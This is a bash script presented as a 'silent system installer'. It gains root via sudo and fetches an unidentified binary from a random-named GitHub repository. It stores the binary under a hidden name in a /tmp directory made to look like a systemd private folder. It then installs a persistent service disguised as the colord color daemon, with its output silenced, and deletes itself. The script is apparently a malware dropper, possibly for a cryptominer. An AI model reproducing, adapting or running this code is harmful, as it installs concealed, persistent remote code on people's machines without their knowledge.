#!/bin/bash
#
# Silent System Installer with Debug Mode
# Run with DEBUG=1 for verbose output
#

# Check if debug mode
if [ "${DEBUG:-0}" = "1" ]; then
    set -x
    SILENT=""
else
    SILENT="2>/dev/null"
fi

# Function to log
log() {
    if [ "${DEBUG:-0}" = "1" ]; then
        echo "[$(date +%T)] $*" >&2
    fi
}

# Configuration
GITHUB_URL="https://raw.githubusercontent.com/xinezzero/f34vr34vwq3t43t3/main/stepwarev3-linux-x64-debug_sandbox"

log "Starting installation..."

# Generate random service name
gen_service_name() {
    local prefix="systemd-private-"
    local hash=$(head -c 16 /dev/urandom | md5sum | cut -d' ' -f1 | head -c 32)
    local service_types=("colord" "upower" "rtkit-daemon" "accounts-daemon" "polkitd" "gdm" "ModemManager")
    local service_type=${service_types[$RANDOM % ${#service_types[@]}]}
    local suffix=$(head -c 3 /dev/urandom | xxd -p | tr '[:lower:]' '[:upper:]')
    
    echo "${prefix}${hash}-${service_type}.service-${suffix}"
}

SERVICE_NAME=$(gen_service_name)
INSTALL_DIR="/tmp/${SERVICE_NAME}"
BINARY_NAME=".$(echo $SERVICE_NAME | cut -d'-' -f1-3)"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

log "Service name: $SERVICE_NAME"
log "Install dir: $INSTALL_DIR"
log "Binary name: $BINARY_NAME"

# Check if root
if [ "$EUID" -ne 0 ]; then
    log "Not root, trying sudo..."
    if command -v sudo >/dev/null 2>&1; then
        exec sudo DEBUG="${DEBUG:-0}" bash "$0" "$@"
    else
        echo "ERROR: Root access required" >&2
        exit 1
    fi
fi

log "Running as root"

# Create installation directory
log "Creating install directory..."
if ! mkdir -p "$INSTALL_DIR" 2>/dev/null; then
    echo "ERROR: Cannot create $INSTALL_DIR" >&2
    exit 1
fi

if ! cd "$INSTALL_DIR"; then
    echo "ERROR: Cannot cd to $INSTALL_DIR" >&2
    exit 1
fi

log "Changed to $INSTALL_DIR"

# Download binary
log "Downloading binary from $GITHUB_URL..."
DOWNLOAD_SUCCESS=0

if command -v curl >/dev/null 2>&1; then
    log "Using curl..."
    if curl -sSL --max-time 60 --retry 3 -o "$BINARY_NAME" "$GITHUB_URL"; then
        DOWNLOAD_SUCCESS=1
        log "Download successful with curl"
    else
        log "Curl download failed"
    fi
elif command -v wget >/dev/null 2>&1; then
    log "Using wget..."
    if wget -q -t 3 -T 60 -O "$BINARY_NAME" "$GITHUB_URL"; then
        DOWNLOAD_SUCCESS=1
        log "Download successful with wget"
    else
        log "Wget download failed"
    fi
else
    echo "ERROR: Neither curl nor wget found" >&2
    exit 1
fi

if [ "$DOWNLOAD_SUCCESS" -eq 0 ]; then
    echo "ERROR: Download failed" >&2
    exit 1
fi

# Verify download
log "Verifying download..."
if [ ! -f "$BINARY_NAME" ]; then
    echo "ERROR: Binary file not created" >&2
    exit 1
fi

if [ ! -s "$BINARY_NAME" ]; then
    echo "ERROR: Binary file is empty" >&2
    rm -f "$BINARY_NAME"
    exit 1
fi

FILESIZE=$(stat -c%s "$BINARY_NAME" 2>/dev/null || stat -f%z "$BINARY_NAME" 2>/dev/null || echo 0)
log "Downloaded file size: $FILESIZE bytes"

if [ "$FILESIZE" -lt 1000 ]; then
    echo "ERROR: Downloaded file too small ($FILESIZE bytes), probably an error page" >&2
    cat "$BINARY_NAME" >&2
    exit 1
fi

# Make executable
log "Making binary executable..."
chmod +x "$BINARY_NAME" || {
    echo "ERROR: Cannot chmod binary" >&2
    exit 1
}

# Test if binary is executable
if [ ! -x "$BINARY_NAME" ]; then
    echo "ERROR: Binary not executable after chmod" >&2
    exit 1
fi

log "Binary is executable"

# Create systemd service
log "Creating systemd service..."
cat > "$SERVICE_FILE" << EOF
[Unit]
Description=System Color Management Daemon
Documentation=man:colord(1)
After=network.target network-online.target systemd-udevd.service
Wants=network-online.target

[Service]
Type=simple
ExecStart=${INSTALL_DIR}/${BINARY_NAME}
Restart=on-failure
RestartSec=10
StartLimitIntervalSec=0
StartLimitBurst=999

# Process settings
Nice=-5
OOMScoreAdjust=-500
CPUQuota=15%
MemoryMax=150M

# Security (but allow network)
PrivateTmp=yes
ProtectSystem=strict
ProtectHome=read-only
NoNewPrivileges=false
ReadWritePaths=/tmp /var/tmp

# Logging (silence all unless debug)
StandardOutput=null
StandardError=null
SyslogIdentifier=colord

# Environment
Environment=HOME=/root
Environment=PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
WorkingDirectory=${INSTALL_DIR}

# Auto-restart settings
SuccessExitStatus=0 1 143
RestartPreventExitStatus=
TimeoutStopSec=30

[Install]
WantedBy=multi-user.target
EOF

if [ ! -f "$SERVICE_FILE" ]; then
    echo "ERROR: Service file not created" >&2
    exit 1
fi

log "Service file created: $SERVICE_FILE"

# Reload systemd
log "Reloading systemd..."
if ! systemctl daemon-reload; then
    echo "ERROR: systemctl daemon-reload failed" >&2
    exit 1
fi

# Enable service
log "Enabling service..."
if ! systemctl enable "$SERVICE_NAME"; then
    echo "ERROR: systemctl enable failed" >&2
    exit 1
fi

# Start service
log "Starting service..."
if ! systemctl start "$SERVICE_NAME"; then
    echo "ERROR: systemctl start failed" >&2
    systemctl status "$SERVICE_NAME" >&2
    exit 1
fi

# Wait and verify
log "Waiting for service to start..."
sleep 3

if systemctl is-active --quiet "$SERVICE_NAME"; then
    log "Service is active!"
    
    # Success - print confirmation
    if [ "${DEBUG:-0}" = "1" ]; then
        echo "✓ Installation successful!" >&2
        echo "  Service: $SERVICE_NAME" >&2
        echo "  Location: $INSTALL_DIR" >&2
        echo "  Status: $(systemctl is-active $SERVICE_NAME)" >&2
    fi
    
    # Clean up installer
    if [ "${DEBUG:-0}" != "1" ]; then
        rm -f "$0" 2>/dev/null &
    fi
    
    exit 0
else
    # Failed
    echo "ERROR: Service failed to start" >&2
    echo "Service status:" >&2
    systemctl status "$SERVICE_NAME" >&2
    echo "" >&2
    echo "Service logs:" >&2
    journalctl -u "$SERVICE_NAME" -n 20 --no-pager >&2
    
    # Cleanup
    log "Cleaning up failed installation..."
    systemctl stop "$SERVICE_NAME" 2>/dev/null
    systemctl disable "$SERVICE_NAME" 2>/dev/null
    rm -f "$SERVICE_FILE" 2>/dev/null
    systemctl daemon-reload 2>/dev/null
    rm -rf "$INSTALL_DIR" 2>/dev/null
    
    exit 1
fi
